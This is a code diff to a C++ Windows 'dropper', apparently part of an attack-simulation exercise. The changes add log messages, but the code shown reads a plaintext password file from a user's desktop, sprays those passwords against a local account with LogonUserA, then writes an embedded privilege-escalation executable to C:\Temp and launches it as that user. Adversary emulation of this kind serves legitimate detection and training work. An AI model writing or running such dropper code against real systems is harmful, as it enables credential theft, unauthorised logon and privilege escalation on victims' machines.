@@ -6,6 +6,7 @@ int wmain() {
 	// TODO: simulate attacker looking for password docs with powershell
 
 	// read passwords in doc
+	Log("[+] Reading password doc.", "dropper");
 	std::ifstream file;
 	file.open(L"C:\\Users\\NineBall\\Desktop\\notmypasswords.txt", std::ios::in);
 	std::vector<std::string> passList;
@@ -20,9 +21,10 @@ int wmain() {
 	file.close();
 
 	// attempt to authenticate as NineBall with passwords
+	Log("[+] Starting password spray.", "dropper");
 	HANDLE hToken = NULL;
 	for (std::string s : passList) {
-		Log("\"" + s + "\"", "dropper");
+		Log("  [*] Trying password \"" + s + "\"", "dropper");
 		if (LogonUserA(
 			"NineBall",
 			".",
@@ -37,17 +39,19 @@ int wmain() {
 	}
 
 	if (hToken == NULL || hToken == INVALID_HANDLE_VALUE) {
-		Log("failed to get NineBall token", "dropper");
+		Log("[!] Failed to get NineBall token", "dropper");
 	}
 
-	Log("pass: \"" + pass + "\"", "dropper");
+	Log("[*] Valid password: \"" + pass + "\"", "dropper");
 
 	// write the privesc to disk
+	Log("[+] Writing privesc to disk.", "dropper");
 	std::ofstream outfile("C:\\Temp\\privesc.exe", std::ios::out | std::ios::binary);
 	outfile.write(&privesc[0], sizeof(privesc));
 	outfile.close();
 
 	// create privesc process as NineBall
+	Log("[+] Starting privesc.", "dropper");
 	STARTUPINFO si;
 	PROCESS_INFORMATION pi;
 	ZeroMemory(&si, sizeof(si));
@@ -75,6 +79,9 @@ int wmain() {
 		&pi
 	)) {
 		Log("[!] Failed to create privesc process." + std::to_string(GetLastError()), "dropper");
+	}
+	else {
+		Log("[+] Successfully created privesc process.", "dropper");
 	}
 
 	// unsure if these will cause dropper to stay up
